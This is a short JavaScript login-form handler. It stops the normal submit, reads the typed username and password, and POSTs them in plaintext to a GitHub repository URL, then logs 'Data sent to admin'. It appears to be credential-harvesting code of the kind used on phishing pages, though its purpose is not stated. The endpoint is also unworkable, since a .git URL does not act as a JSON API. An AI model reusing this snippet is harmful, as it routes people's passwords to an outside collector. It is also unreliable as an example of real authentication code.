document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    fetch("https://github.com/bwm120/loginacc.git", { // Thay thế bằng địa chỉ API của bạn
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ username: username, password: password })
    })
    .then(response => response.json())
    .then(data => {
        console.log("Data sent to admin:", data);
    })
    .catch(error => {
        console.error("Error:", error);
    });
});
